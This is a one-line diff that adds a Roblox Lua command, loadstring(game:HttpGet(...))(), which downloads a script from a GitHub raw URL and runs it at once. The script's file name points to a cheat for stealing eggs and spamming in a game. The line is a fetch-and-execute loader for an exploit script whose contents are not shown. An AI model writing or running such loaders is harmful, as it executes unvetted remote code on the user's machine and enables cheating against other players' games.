@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/clone-to-steal-eggs-spam6-e0vjtwm8gpowjy.lua"))()
